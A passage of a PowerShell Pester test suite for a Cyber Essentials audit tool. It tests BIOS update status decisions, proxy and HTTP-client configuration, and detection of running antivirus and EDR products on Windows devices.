                $err.Message | Should -Match 'remote name could not be resolved'
                (Get-CEFirmwareCatalogRecord -Hardware ([pscustomobject]@{ Manufacturer = 'Acer' })).Status | Should -Be 'Unsupported'
            }
        }
    }

    Context 'SU-08 decisions' {
        It 'passes when the installed BIOS is the latest' {
            Set-TestCatalog -Installed '1.17.0' -Record (New-TestCatalogRecord -Releases @((New-TestRelease '1.17.0' 30 'Urgent'), (New-TestRelease '1.16.0' 40 'Urgent')))
            $f = & $script:firmwareOf
            $f.Status | Should -Be 'Pass'
            $f.Actual | Should -Match 'is the latest for Contoso Laptop 14 G5'
            @($f.Evidence) -join "`n" | Should -Match 'Firmware catalog: Found'
        }

        It 'reads catalog timestamps as UTC after a JSON round trip (pwsh 7 turns them into DateTime)' {
            $checked = [datetime]::UtcNow.AddHours(-3)
            $json = New-TestCatalogRecord -Releases @(New-TestRelease '1.17.0' 30) -CheckedAt $checked | ConvertTo-Json -Depth 5
            Set-TestCatalog -Installed '1.17.0' -Record ($json | ConvertFrom-Json)
            $f = & $script:firmwareOf
            $f.Status | Should -Be 'Pass'
            @($f.Evidence) -join "`n" | Should -Match ([regex]::Escape("checked $($checked.ToString('yyyy-MM-dd HH:mm')) UTC"))
        }

        It 'fails when an urgent update has been available for longer than the patch window' {
            Set-TestCatalog -Installed '1.14.1' -Record (New-TestCatalogRecord -Releases @((New-TestRelease '1.17.0' 10 'Recommended'), (New-TestRelease '1.16.0' 40 'Urgent'), (New-TestRelease '1.14.1' 100 'Urgent')))
            $f = & $script:firmwareOf
            $f.Status | Should -Be 'Fail'
            $f.Actual | Should -Match 'latest is 1\.17\.0 .* 2 newer release\(s\); the manufacturer marked 1\.16\.0 urgent 40 days ago'
            $f.Recommendation | Should -Match 'Dell Command \| Update'
        }

        It 'warns when behind without an overdue urgent release, and passes inside the patch window' {
            Set-TestCatalog -Installed '1.14.1' -Record (New-TestCatalogRecord -Releases @((New-TestRelease '1.17.0' 30 'Recommended'), (New-TestRelease '1.14.1' 100)))
            (& $script:firmwareOf).Status | Should -Be 'Warn'
            Set-TestCatalog -Installed '1.14.1' -Record (New-TestCatalogRecord -Releases @((New-TestRelease '1.17.0' 5 'Urgent'), (New-TestRelease '1.14.1' 100)))
            $f = & $script:firmwareOf
            $f.Status | Should -Be 'Pass'
            $f.Actual | Should -Match 'within the 14-day patch window'
            $f.Recommendation | Should -Match 'Install BIOS 1\.17\.0'
        }

        It 'warns when the device is current but the model has had no firmware for a long time' {
            Set-TestCatalog -Installed '1.17.0' -Record (New-TestCatalogRecord -Releases @(New-TestRelease '1.17.0' 900))
            $f = & $script:firmwareOf
            $f.Status | Should -Be 'Warn'
            $f.Actual | Should -Match 'no firmware has been released for this model since'
        }

        It 'falls back to BIOS age when the record is stale, versions do not compare, or there is no record' {
            Set-TestCatalog -Installed '1.17.0' -Record (New-TestCatalogRecord -Releases @(New-TestRelease '1.18.0' 100 'Urgent') -CheckedAt (Get-Date).AddDays(-10))
            $f = & $script:firmwareOf
            $f.Actual | Should -Match 'months ago'
            @($f.Evidence) -join "`n" | Should -Match 'not used'

            Set-TestCatalog -Installed 'A24' -Record (New-TestCatalogRecord -Releases @(New-TestRelease '1.18.0' 100 'Urgent'))
            @((& $script:firmwareOf).Evidence) -join "`n" | Should -Match 'Could not compare'

            Set-TestCatalog -Status 'NotFound' -Record $null
            (& $script:firmwareOf).Actual | Should -Match 'months ago'
        }
    }

    Context 'service client and proxy' {
        BeforeAll {
            function global:New-TestWinHttpBlob {
                param([int]$Flags, [string]$Proxy = '', [string]$Bypass = '')
                $list = New-Object System.Collections.ArrayList
                foreach ($n in @(0x28, 0, $Flags)) { $list.AddRange([BitConverter]::GetBytes([uint32]$n)) }
                $p = [Text.Encoding]::ASCII.GetBytes($Proxy)
                $list.AddRange([BitConverter]::GetBytes([uint32]$p.Length)); $list.AddRange($p)
                $b = [Text.Encoding]::ASCII.GetBytes($Bypass)
                $list.AddRange([BitConverter]::GetBytes([uint32]$b.Length)); $list.AddRange($b)
                , [byte[]]$list.ToArray()
            }
        }

        It 'accepts https, and plain http only for this device' {
            InModuleScope CEAudit {
                (Resolve-CEServiceUri -BaseUrl 'https://baseline.engramic.ai/' -Path 'v1/firmware/dell/0CF1').Uri.AbsoluteUri | Should -Be 'https://baseline.engramic.ai/v1/firmware/dell/0CF1'
                (Resolve-CEServiceUri -BaseUrl 'http://localhost:8787' -Path '/v1/firmware/dell/0CF1').Uri.AbsoluteUri | Should -Be 'http://localhost:8787/v1/firmware/dell/0CF1'
                (Resolve-CEServiceUri -BaseUrl 'http://baseline.engramic.ai' -Path 'x').Uri | Should -BeNullOrEmpty
                (Resolve-CEServiceUri -BaseUrl 'http://baseline.engramic.ai' -Path 'x').Error | Should -Match 'https'
                (Resolve-CEServiceUri -BaseUrl '' -Path 'x').Uri | Should -BeNullOrEmpty
                (Resolve-CEServiceUri -BaseUrl 'not a url' -Path 'x').Uri | Should -BeNullOrEmpty
                (Resolve-CEServiceUri -BaseUrl 'file:///C:/x' -Path 'x').Uri | Should -BeNullOrEmpty
            }
        }

        It 'parses the machine WinHTTP proxy setting' {
            InModuleScope CEAudit {
                ConvertFrom-CEWinHttpProxyBlob -Blob (New-TestWinHttpBlob -Flags 1) | Should -BeNullOrEmpty -Because 'direct access'
                ConvertFrom-CEWinHttpProxyBlob -Blob ([byte[]]@(1, 2, 3)) | Should -BeNullOrEmpty
                $one = ConvertFrom-CEWinHttpProxyBlob -Blob (New-TestWinHttpBlob -Flags 3 -Proxy 'proxy.contoso.com:8080')
                $one.Proxy | Should -Be 'proxy.contoso.com:8080'
                @($one.Bypass).Count | Should -Be 0
                (Select-CEWinHttpProxy -Proxy $one.Proxy -Scheme https).AbsoluteUri | Should -Be 'http://proxy.contoso.com:8080/'
                (Select-CEWinHttpProxy -Proxy $one.Proxy -Scheme http).AbsoluteUri | Should -Be 'http://proxy.contoso.com:8080/' -Because 'one proxy for every scheme'
                $schemes = ConvertFrom-CEWinHttpProxyBlob -Blob (New-TestWinHttpBlob -Flags 3 -Proxy 'http=web.contoso.com:80;https=secure.contoso.com:8443' -Bypass '<local>;*.contoso.com')
                (Select-CEWinHttpProxy -Proxy $schemes.Proxy -Scheme https).Authority | Should -Be 'secure.contoso.com:8443'
                (Select-CEWinHttpProxy -Proxy $schemes.Proxy -Scheme http).Authority | Should -Be 'web.contoso.com'
                Select-CEWinHttpProxy -Proxy 'http=web.contoso.com:80' -Scheme https | Should -BeNullOrEmpty -Because 'WinHTTP sends https direct when only http has a proxy'
                Select-CEWinHttpProxy -Proxy 'https=https://secure.contoso.com:8443' -Scheme https | Should -BeNullOrEmpty -Because 'Windows PowerShell 5.1 cannot use an https proxy address'
                @($schemes.Bypass) | Should -Be @('<local>', '*.contoso.com')
                Test-CEProxyBypass -HostName 'intranet' -Bypass $schemes.Bypass | Should -BeTrue
                Test-CEProxyBypass -HostName 'files.contoso.com' -Bypass $schemes.Bypass | Should -BeTrue
                Test-CEProxyBypass -HostName 'baseline.engramic.ai' -Bypass $schemes.Bypass | Should -BeFalse
            }
        }

        It 'uses network.json first, then the WinHTTP proxy only as SYSTEM' {
            InModuleScope CEAudit {
                $saved = (Get-CEConfig).network
                try {
                    $uri = [Uri]'https://baseline.engramic.ai/v1/firmware/dell/0CF1'
                    Mock Get-CEWinHttpProxyBlob { New-TestWinHttpBlob -Flags 3 -Proxy 'proxy.contoso.com:8080' -Bypass '<local>' }
                    (Get-CEConfig).network = [pscustomobject]@{ proxyUrl = ''; useWinHttpProxyWhenSystem = $true }
                    Mock Test-CEIsSystem { $false }
                    (Get-CEProxySetting -Uri $uri).Mode | Should -Be 'System' -Because 'a user keeps their own proxy settings'
                    Mock Test-CEIsSystem { $true }
                    $p = Get-CEProxySetting -Uri $uri
                    $p.Mode | Should -Be 'Proxy'
                    $p.Address.Authority | Should -Be 'proxy.contoso.com:8080'
                    (Get-CEProxySetting -Uri ([Uri]'http://localhost:8787/x')).Mode | Should -Be 'Direct' -Because '<local> covers names without a dot'
                    (Get-CEConfig).network = [pscustomobject]@{ proxyUrl = ''; useWinHttpProxyWhenSystem = $false }
                    (Get-CEProxySetting -Uri $uri).Mode | Should -Be 'System'
                    $p.UseDefaultCredentials | Should -BeTrue -Because 'only an administrator can set the WinHTTP proxy'
                    (Get-CEConfig).network = [pscustomobject]@{ proxyUrl = 'http://configured.contoso.com:3128'; useWinHttpProxyWhenSystem = $true }
                    $configured = Get-CEProxySetting -Uri $uri
                    $configured.Address.Authority | Should -Be 'configured.contoso.com:3128'
                    $configured.UseDefaultCredentials | Should -BeFalse -Because 'a proxy named in a config file gets no Windows sign-in unless asked'
                    (Get-CEConfig).network = [pscustomobject]@{ proxyUrl = 'http://configured.contoso.com:3128'; proxyUseDefaultCredentials = $true }
                    (Get-CEProxySetting -Uri $uri).UseDefaultCredentials | Should -BeTrue
                    (Get-CEConfig).network = [pscustomobject]@{ proxyUrl = 'http://configured.contoso.com:3128'; proxyUseDefaultCredentials = 'yes' }
                    (Get-CEProxySetting -Uri $uri).UseDefaultCredentials | Should -BeFalse -Because 'only JSON true turns it on'
                    (Get-CEConfig).network = [pscustomobject]@{ proxyUrl = 'socks5://x:1080' }
                    (Get-CEProxySetting -Uri $uri -WarningAction SilentlyContinue).Address.Authority | Should -Be 'proxy.contoso.com:8080'
                }
                finally { (Get-CEConfig).network = $saved }
            }
        }

        It 'goes direct as SYSTEM when the WinHTTP proxy is set only for another scheme' {
            InModuleScope CEAudit {
                $saved = (Get-CEConfig).network
                try {
                    (Get-CEConfig).network = [pscustomobject]@{ proxyUrl = ''; useWinHttpProxyWhenSystem = $true }
                    Mock Test-CEIsSystem { $true }
                    Mock Get-CEWinHttpProxyBlob { New-TestWinHttpBlob -Flags 3 -Proxy 'http=web.contoso.com:80' }
                    $p = Get-CEProxySetting -Uri ([Uri]'https://baseline.engramic.ai/v1/firmware/dell/0CF1')
                    $p.Mode | Should -Be 'Direct' -Because 'as in WinHTTP, the http= entry does not apply to https'
                    $p.UseDefaultCredentials | Should -BeFalse
                    $p = Get-CEProxySetting -Uri ([Uri]'http://intranet.contoso.com/x')
                    $p.Mode | Should -Be 'Proxy'
                    $p.Address.Authority | Should -Be 'web.contoso.com'
                }
                finally { (Get-CEConfig).network = $saved }
            }
        }

        It 'refuses an https proxyUrl with a warning that says to use the http address' {
            # .NET Framework (Windows PowerShell 5.1, which runs the scheduled audit) throws for a
            # proxy at an https address, so every request would fail.
            InModuleScope CEAudit {
                $saved = (Get-CEConfig).network
                try {
                    Mock Test-CEIsSystem { $false }
                    (Get-CEConfig).network = [pscustomobject]@{ proxyUrl = 'https://proxy.contoso.com:8443'; useWinHttpProxyWhenSystem = $true }
                    $p = Get-CEProxySetting -Uri ([Uri]'https://baseline.engramic.ai/x') -WarningVariable warned -WarningAction SilentlyContinue
                    $p.Mode | Should -Be 'System'
                    "$warned" | Should -Match 'http://'
                    "$warned" | Should -Match 'Windows PowerShell'
                }
                finally { (Get-CEConfig).network = $saved }
            }
        }

        It 'builds the HTTP handler from the proxy setting and sends Windows sign-in only to a proxy allowed it: <Name>' -ForEach @(
            @{ Name = 'network.json proxy'; Setting = @{ Mode = 'Proxy'; Address = [Uri]'http://configured.contoso.com:3128'; Source = 'network.json'; UseDefaultCredentials = $false }; UseProxy = $true; SignInToProxy = $false }
            @{ Name = 'network.json proxy with proxyUseDefaultCredentials'; Setting = @{ Mode = 'Proxy'; Address = [Uri]'http://configured.contoso.com:3128'; Source = 'network.json'; UseDefaultCredentials = $true }; UseProxy = $true; SignInToProxy = $true }
            @{ Name = 'WinHTTP proxy'; Setting = @{ Mode = 'Proxy'; Address = [Uri]'http://proxy.contoso.com:8080'; Source = 'WinHTTP'; UseDefaultCredentials = $true }; UseProxy = $true; SignInToProxy = $true }
            @{ Name = 'direct'; Setting = @{ Mode = 'Direct'; Address = $null; Source = 'WinHTTP'; UseDefaultCredentials = $false }; UseProxy = $false; SignInToProxy = $null }
            @{ Name = 'system default'; Setting = @{ Mode = 'System'; Address = $null; Source = ''; UseDefaultCredentials = $false }; UseProxy = $true; SignInToProxy = $null }
        ) {
            InModuleScope CEAudit -Parameters @{ Setting = $Setting; UseProxy = $UseProxy; SignInToProxy = $SignInToProxy } {
                param($Setting, $UseProxy, $SignInToProxy)
                $handler = New-CEHttpHandler -Proxy $Setting
                try {
                    $handler.UseDefaultCredentials | Should -BeFalse -Because 'the site itself never gets the Windows sign-in'
                    $handler.UseProxy | Should -Be $UseProxy
                    if ($Setting.Mode -eq 'Proxy') {
                        $handler.Proxy | Should -BeOfType ([System.Net.WebProxy])
                        $handler.Proxy.Address.Authority | Should -Be $Setting.Address.Authority
                        $handler.Proxy.UseDefaultCredentials | Should -Be $SignInToProxy
                        $handler.Proxy.BypassProxyOnLocal | Should -BeTrue
                    }
                    else {
                        $handler.Proxy | Should -Not -BeOfType ([System.Net.WebProxy]) -Because 'no proxy of our own is set'
                    }
                }
                finally { $handler.Dispose() }
            }
        }

        It 'sends each request through a handler built from the proxy setting for its address' {
            InModuleScope CEAudit {
                $real = ${function:Invoke-CEHttpRequest}
                Mock Get-CEProxySetting { @{ Mode = 'Direct'; Address = $null; Source = 'WinHTTP'; UseDefaultCredentials = $false } }
                Mock New-CEHttpHandler { Add-Type -AssemblyName System.Net.Http; [System.Net.Http.HttpClientHandler]::new() }
                $r = & $real -Uri 'http://localhost:1/v1/firmware/dell/0CF1' -TimeoutSeconds 5
                $r.StatusCode | Should -Be 0
                Should -Invoke Get-CEProxySetting -Times 1 -Exactly -ParameterFilter { $Uri.AbsoluteUri -eq 'http://localhost:1/v1/firmware/dell/0CF1' }
                Should -Invoke New-CEHttpHandler -Times 1 -Exactly -ParameterFilter { $Proxy.Mode -eq 'Direct' }
            }
            # No other code builds a handler, so the checks above cover every request.
            $text = Get-Content -LiteralPath (Join-Path (Join-Path (Join-Path (Join-Path $script:RepoRoot 'src') 'CEAudit') 'Private') '14-ServiceClient.ps1') -Raw
            ([regex]::Matches($text, 'HttpClientHandler\]::new')).Count | Should -Be 1
        }

        It 'ships network.json with no proxy and the WinHTTP fallback on' {
            $cfg = Get-Content (Join-Path (Join-Path $script:RepoRoot 'config') 'network.json') -Raw | ConvertFrom-Json
            $cfg.proxyUrl | Should -Be ''
            $cfg.proxyUseDefaultCredentials | Should -BeFalse
            $cfg.useWinHttpProxyWhenSystem | Should -BeTrue
        }

        It 'keeps the firmware catalog wrapper: throws on network errors with the proxy hint' {
            InModuleScope CEAudit {
                Mock Invoke-CEHttpRequest { @{ StatusCode = 0; Body = ''; ETag = ''; Error = 'No such host is known. If this device uses a proxy, set proxyUrl in network.json.' } }
                { Invoke-CEHttpGet -Uri 'https://baseline.engramic.ai/v1/firmware/dell/0CF1' } | Should -Throw '*proxyUrl in network.json*'
                Mock Invoke-CEHttpRequest { @{ StatusCode = 304; Body = ''; ETag = '"abc"'; Error = '' } }
                $r = Invoke-CEHttpGet -Uri 'https://baseline.engramic.ai/v1/firmware/dell/0CF1' -ETag '"abc"'
                $r.StatusCode | Should -Be 304
                $r.ETag | Should -Be '"abc"'
                Should -Invoke Invoke-CEHttpRequest -Times 1 -Exactly -ParameterFilter { $ETag -eq '"abc"' -and $MaxBytes -eq 4194304 }
            }
        }

        It 'reports a network failure as data, never an exception' {
            InModuleScope CEAudit {
                # The real function (the tripwire mock stands in front of it): nothing listens on port 1.
                $real = ${function:Invoke-CEHttpRequest}
                $r = & $real -Uri 'http://localhost:1/v1/firmware/dell/0CF1' -TimeoutSeconds 5
                $r.StatusCode | Should -Be 0
                $r.Error | Should -Match 'proxyUrl in network\.json'
            }
        }

        It 'sends every service request through the shared client' {
            # One place applies the proxy, TLS 1.2 on Windows PowerShell 5.1 and the size limits.
            $src = Join-Path (Join-Path $script:RepoRoot 'src') 'CEAudit'
            $problems = foreach ($file in Get-ChildItem -Path $src -Recurse -Filter '*.ps1') {
                if ($file.Name -eq '14-ServiceClient.ps1') { continue }
                $text = Get-Content -LiteralPath $file.FullName -Raw
                foreach ($pattern in @('Net\.Http\.HttpClient\b', 'Net\.WebClient\b', '\bInvoke-WebRequest\b', '\bInvoke-RestMethod\b')) {
                    if ($text -match $pattern) { "$($file.Name) matches $pattern" }
                }
            }
            @($problems) -join "`n" | Should -BeNullOrEmpty
        }
    }
}

Describe 'Anti-malware detection (MP-01)' {
    BeforeAll {
        function global:Set-TestAntimalware {
            <#
                DefenderMode: Normal, 'Passive Mode', 'EDR Block Mode' or Absent.
                Services: hashtable name -> status. Filters: hashtable name -> altitude.
            #>
            param(
                [string]$OS = 'Windows Server', [string]$DefenderMode = 'Normal', [hashtable]$Services = @{}, [hashtable]$Filters = @{},
                [string[]]$LoadedDrivers = @(), [object[]]$SecurityCenter = @(), [bool]$Elevated = $true, [string]$Feature = 'Installed'
            )
            $ctx = @{ OSFamily = $OS; IsElevated = $Elevated }
            if ($OS -eq 'Windows Server') { $ctx.EditionClass = 'Server' }
            Set-TestDevice -Kind Secure -ContextOverride $ctx
            $global:CETestServiceList = @($Services.Keys | ForEach-Object { [pscustomobject]@{ Name = $_; Status = $Services[$_]; StartType = 'Automatic' } })
            $global:CETestDrivers = @($LoadedDrivers | ForEach-Object { [pscustomobject]@{ Name = $_; State = 'Running' } })
            $global:CETestFltmc = @('Filter Name                     Num Instances    Altitude    Frame', '------------------------------  -------------  ------------  -----') +
                @($Filters.Keys | ForEach-Object { '{0,-30}  {1,13}  {2,12}  {3,5}' -f $_, 4, $Filters[$_], 0 })
            $global:CETestSC = $SecurityCenter
            $global:CETestDefenderMode = $DefenderMode
            $global:CETestFeature = $Feature
            Mock -ModuleName CEAudit Get-CEAntivirusProducts { $global:CETestSC }
            Mock -ModuleName CEAudit Get-CEDefenderStatus {
                if ($global:CETestDefenderMode -eq 'Absent') { return $null }
                [pscustomobject]@{ AMRunningMode = $global:CETestDefenderMode; AntivirusEnabled = $true; RealTimeProtectionEnabled = $true; BehaviorMonitorEnabled = $true
                    IoavProtectionEnabled = $true; OnAccessProtectionEnabled = $true; IsTamperProtected = $true; AntivirusSignatureLastUpdated = (Get-Date).AddHours(-1)
                    AntivirusSignatureVersion = '1'; AMEngineVersion = '1'; AMProductVersion = '4.18' }
            }
            Mock -ModuleName CEAudit Get-WindowsFeature { [pscustomobject]@{ Name = 'Windows-Defender'; InstallState = $global:CETestFeature } }
            InModuleScope CEAudit {
                (Get-CEConfig).'av-products' = [pscustomobject]@{ products = @(
                    [pscustomobject]@{ id = 'microsoft-defender'; name = 'Microsoft Defender Antivirus'; kind = 'antivirus'; isDefender = $true; services = @('WinDefend'); drivers = @('WdFilter') },
                    [pscustomobject]@{ id = 'contoso-av'; name = 'Contoso AV'; kind = 'antivirus'; services = @('ContosoAV*'); drivers = @('ContosoFlt') },
                    [pscustomobject]@{ id = 'fabrikam-edr'; name = 'Fabrikam EDR'; kind = 'edr'; services = @('FabrikamSensor'); drivers = @('FabrikamMon'); notes = 'Fabrikam relies on Defender to block.' }
                ) }
            }
        }
        InModuleScope CEAudit { $script:realAvProducts = (Get-CEConfig).'av-products' }
        $script:mp01 = { @(Invoke-CEAuditCore -Id 'MP-01') }
        $script:bySubject = { param($f, $subject) @($f | Where-Object { $_.Subject -eq $subject }) }
    }
    AfterAll {
        InModuleScope CEAudit { (Get-CEConfig).'av-products' = $script:realAvProducts }
    }

    It 'the shipped product list is well formed' {
        $list = Get-Content (Join-Path (Join-Path $script:RepoRoot 'config') 'av-products.json') -Raw | ConvertFrom-Json
        $list.lastReviewed | Should -Match '^\d{4}-\d{2}-\d{2}$'
        $ids = @($list.products | ForEach-Object { $_.id })
        ($ids | Sort-Object -Unique).Count | Should -Be $ids.Count
        @($list.products | Where-Object { $_.PSObject.Properties['isDefender'] -and $_.isDefender }).Count | Should -Be 1
        foreach ($p in @($list.products)) {
            @('antivirus', 'edr') | Should -Contain $p.kind -Because $p.id
            (@($p.services) + @($p.drivers) | Where-Object { $_ }).Count | Should -BeGreaterThan 0 -Because $p.id
            foreach ($pattern in @(@($p.services) + @($p.drivers) | Where-Object { $_ })) {
                ($pattern -replace '[*?]', '').Length | Should -BeGreaterOrEqual 4 -Because "$($p.id) pattern '$pattern' must not match unrelated services"
                $pattern | Should -Not -Match '[\[\]]' -Because "$($p.id) pattern '$pattern' would be a -like character class"
            }
            @($p.sources).Count | Should -BeGreaterThan 0 -Because $p.id
            foreach ($u in @($p.sources)) { $u | Should -Match '^https://' -Because $p.id }
        }
    }

    It 'the shipped list recognises real products: kernel-driver services, versioned names and EDR-only agents' {
        Set-TestAntimalware -DefenderMode 'Absent' -Services @{ CSFalconService = 'Running' } -LoadedDrivers @('CSAgent') -Filters @{ CSAgent = 321410 }
        InModuleScope CEAudit { (Get-CEConfig).'av-products' = $script:realAvProducts }
        $f = @(& $script:mp01)
        (& $script:bySubject $f '').Actual | Should -Be 'CrowdStrike Falcon running'
        (& $script:bySubject $f 'Third-party protection').Recommendation | Should -Match 'Falcon Prevent licence'
        @(& $script:bySubject $f 'Unrecognised driver').Count | Should -Be 0

        Set-TestAntimalware -DefenderMode 'Absent' -Services @{ 'AVP.KES.21.18' = 'Running' } -Filters @{ klif = 323600 }
        InModuleScope CEAudit { (Get-CEConfig).'av-products' = $script:realAvProducts }
        (@(& $script:mp01)[0]).Actual | Should -Match 'Kaspersky Endpoint Security'

        Set-TestAntimalware -DefenderMode 'Passive Mode' -Services @{ WinDefend = 'Running'; HuntressAgent = 'Running'; Sense = 'Running' } -Filters @{ WdFilter = 328010 }
        InModuleScope CEAudit { (Get-CEConfig).'av-products' = $script:realAvProducts }
        $f = @(& $script:mp01)
        $f[0].Status | Should -Be 'Manual'
        $f[0].Actual | Should -Match 'Huntress'
        $f[0].Actual | Should -Match 'Microsoft Defender for Endpoint'
    }

    It 'parses fltmc output, including decimal altitudes, and ignores the header' {
        InModuleScope CEAudit {
            $f = ConvertFrom-CEFltmcFilter -Lines @('Filter Name   Num Instances  Altitude  Frame', '-----  ---  ---  --', 'WdFilter   10   328010   0', 'odd.flt  2  320832.5  0', 'garbage line')
            @($f).Count | Should -Be 2
            $f[1].Name | Should -Be 'odd.flt'
            $f[1].Altitude | Should -Be 320832.5
        }
    }

    It 'Server, Defender running normally: Pass, nothing to confirm' {
        Set-TestAntimalware -DefenderMode 'Normal' -Services @{ WinDefend = 'Running' } -Filters @{ WdFilter = 328010 }
        $f = @(& $script:mp01)
        $f.Count | Should -Be 1
        $f[0].Status | Should -Be 'Pass'
        $f[0].Actual | Should -Be 'Microsoft Defender Antivirus is running'
    }

    It 'Server, Defender passive, known antivirus running with its filter loaded: Pass installed, Manual for blocking and signatures' {
        Set-TestAntimalware -DefenderMode 'Passive Mode' -Services @{ WinDefend = 'Running'; 'ContosoAV.12.3' = 'Running' } -Filters @{ WdFilter = 328010; ContosoFlt = 323100 }
        $f = @(& $script:mp01)
        (& $script:bySubject $f '').Status | Should -Be 'Pass'
        (& $script:bySubject $f '').Actual | Should -Be 'Contoso AV running'
        $manual = & $script:bySubject $f 'Third-party protection'
        $manual.Status | Should -Be 'Manual'
        $manual.Recommendation | Should -Match 'Contoso AV console'
        @($f | Where-Object { $_.Status -in 'Warn', 'Fail' }).Count | Should -Be 0
        $summary = InModuleScope CEAudit -Parameters @{ F = $f } { param($F) Get-CESummary -Findings $F }
        ($summary.CEPlus | Where-Object TestCase -eq 'TC3').State | Should -Be 'Check' -Because 'a third-party product must not make the TC3 estimate a pass'
    }

    It 'Server, Defender feature removed, known antivirus running: Pass installed, Manual for blocking' {
        Set-TestAntimalware -DefenderMode 'Absent' -Feature 'Removed' -Services @{ 'ContosoAV' = 'Running' } -Filters @{ ContosoFlt = 323100 }
        $f = @(& $script:mp01)
        (& $script:bySubject $f '').Status | Should -Be 'Pass'
        (& $script:bySubject $f 'Third-party protection').Status | Should -Be 'Manual'
        @($f[0].Evidence) | Should -Contain 'Windows-Defender feature: Removed'
    }

    It 'Server, Defender absent and nothing else: Fail without a Defender fix' {
        Set-TestAntimalware -DefenderMode 'Absent' -Feature 'Available' -Services @{ Spooler = 'Running' } -Filters @{ bindflt = 409800 }
        $f = @(& $script:mp01)
        $f.Count | Should -Be 1
        $f[0].Status | Should -Be 'Fail'
        $f[0].Actual | Should -Match 'not installed \(feature: Available\)'
        $f[0].Recommendation | Should -Match 'Install-WindowsFeature'
        $f[0].Remediation | Should -BeNullOrEmpty
    }

    It 'Server, Defender passive or in EDR block mode and nothing else: Fail' {
        foreach ($mode in 'Passive Mode', 'EDR Block Mode') {
            Set-TestAntimalware -DefenderMode $mode -Services @{ WinDefend = 'Running' } -Filters @{ WdFilter = 328010 }
            $f = @(& $script:mp01)
            $f[0].Status | Should -Be 'Fail' -Because $mode
            $f[0].Actual | Should -Match ([regex]::Escape("'$mode' mode"))
            $f[0].Remediation.Id | Should -Be 'Defender-EnableRealtime'
        }
    }

    It 'an anti-virus filter that no product claims: Manual on its own, and flagged alongside a known product' {
        Set-TestAntimalware -DefenderMode 'Absent' -Filters @{ MysteryFlt = 324100; bindflt = 409800 }
        $f = @(& $script:mp01)
        $f.Count | Should -Be 1
        $f[0].Status | Should -Be 'Manual'
        $f[0].Actual | Should -Match 'Unrecognised anti-malware driver MysteryFlt \(altitude 324100\): confirm what it is'

        Set-TestAntimalware -DefenderMode 'Absent' -Services @{ ContosoAV = 'Running' } -Filters @{ ContosoFlt = 323100; MysteryFlt = 324100 }
        $f = @(& $script:mp01)
        (& $script:bySubject $f '').Status | Should -Be 'Pass'
        (& $script:bySubject $f 'Unrecognised driver').Status | Should -Be 'Manual'
    }

    It 'two products actively scanning: Warn' {
        Set-TestAntimalware -DefenderMode 'Normal' -Services @{ WinDefend = 'Running'; ContosoAV = 'Running' } -Filters @{ WdFilter = 328010; ContosoFlt = 323100 }
        $f = @(& $script:mp01)
        (& $script:bySubject $f '').Status | Should -Be 'Pass'
        $warn = & $script:bySubject $f 'Multiple products'
        $warn.Status | Should -Be 'Warn'
        $warn.Actual | Should -Match 'Microsoft Defender Antivirus, Contoso AV'
    }

    It 'a detection-only tool: Manual, because Cyber Essentials needs blocking' {
        Set-TestAntimalware -DefenderMode 'Absent' -Services @{ FabrikamSensor = 'Running' }
        $f = @(& $script:mp01)
        $f.Count | Should -Be 1
        $f[0].Status | Should -Be 'Manual'
        $f[0].Recommendation | Should -Match 'blocks malware, not just detects it'
        $f[0].Recommendation | Should -Match 'Fabrikam relies on Defender'
    }

    It 'a known antivirus that is installed but not running: Fail' {
        Set-TestAntimalware -DefenderMode 'Absent' -Services @{ ContosoAV = 'Stopped' }
        $f = @(& $script:mp01)
        $f[0].Status | Should -Be 'Fail'
        $f[0].Actual | Should -Be 'Contoso AV is installed but not running'
    }

    It 'a running antivirus with no filter loaded: Warn that on-access scanning may be off' {
        Set-TestAntimalware -DefenderMode 'Absent' -Services @{ ContosoAV = 'Running' } -Filters @{ bindflt = 409800 }
        (& $script:bySubject (& $script:mp01) 'Filter driver').Status | Should -Be 'Warn'

        Set-TestAntimalware -DefenderMode 'Absent' -Services @{ ContosoAV = 'Running' } -LoadedDrivers @('ContosoFlt') -Filters @{ bindflt = 409800 }
        @(& $script:bySubject (& $script:mp01) 'Filter driver').Count | Should -Be 0 -Because 'the product driver is loaded'
    }

    It 'without elevation, fltmc is not run and the filter checks are skipped' {
        Set-TestAntimalware -DefenderMode 'Absent' -Services @{ ContosoAV = 'Running' } -Elevated $false
        $f = @(& $script:mp01)
        @(& $script:bySubject $f 'Filter driver').Count | Should -Be 0
        @($f[0].Evidence) -join "`n" | Should -Match 'fltmc needs elevation'
        Should -Invoke -ModuleName CEAudit Invoke-CENative -Times 0 -ParameterFilter { $FilePath -eq 'fltmc.exe' }
    }

    It 'Windows 11: Security Center stays the main source, and the filter check confirms it' {
        $contoso = [pscustomobject]@{ Name = 'Contoso AV'; Enabled = $true; UpToDate = $true; IsDefender = $false; State = '0x061000' }
        Set-TestAntimalware -OS 'Windows 11' -DefenderMode 'Passive Mode' -SecurityCenter @($contoso) -Services @{ ContosoAV = 'Running' } -Filters @{ ContosoFlt = 323100; WdFilter = 328010 }
        $f = @(& $script:mp01)
        (& $script:bySubject $f '').Actual | Should -Be 'Active: Contoso AV'
        (& $script:bySubject $f 'Third-party protection').Status | Should -Be 'Manual'
        @($f | Where-Object { $_.Status -in 'Warn', 'Fail' }).Count | Should -Be 0

        $defender = [pscustomobject]@{ Name = 'Microsoft Defender Antivirus'; Enabled = $true; UpToDate = $true; IsDefender = $true; State = '0x061100' }
        Set-TestAntimalware -OS 'Windows 11' -DefenderMode 'Normal' -SecurityCenter @($defender) -Filters @{ bindflt = 409800 }
        $f = @(& $script:mp01)
        (& $script:bySubject $f '').Status | Should -Be 'Pass'
        (& $script:bySubject $f 'Filter driver').Status | Should -Be 'Warn'
    }

    It 'Windows 11: a running antivirus missing from Security Center still counts, with a note' {
        Set-TestAntimalware -OS 'Windows 11' -DefenderMode 'Passive Mode' -SecurityCenter @() -Services @{ ContosoAV = 'Running' } -Filters @{ ContosoFlt = 323100 }
        $f = @(& $script:mp01)
        (& $script:bySubject $f '').Actual | Should -Be 'Contoso AV running, but not registered with Windows Security Center'
        (& $script:bySubject $f 'Third-party protection').Status | Should -Be 'Manual'
    }
}

Describe 'Malware download test (MP-11, CE+ TC3)' {
    BeforeAll {
        InModuleScope CEAudit { $script:realMalwareTest = (Get-CEConfig).'malware-test' }
        function global:Set-TestMalwareAttestation {
            param($TestedOn, $Blocked, [string]$Product = 'Contoso AV')
            InModuleScope CEAudit -Parameters @{ On = $TestedOn; B = $Blocked; P = $Product } {
                param($On, $B, $P)
                $cfg = $script:realMalwareTest | ConvertTo-Json -Depth 5 | ConvertFrom-Json
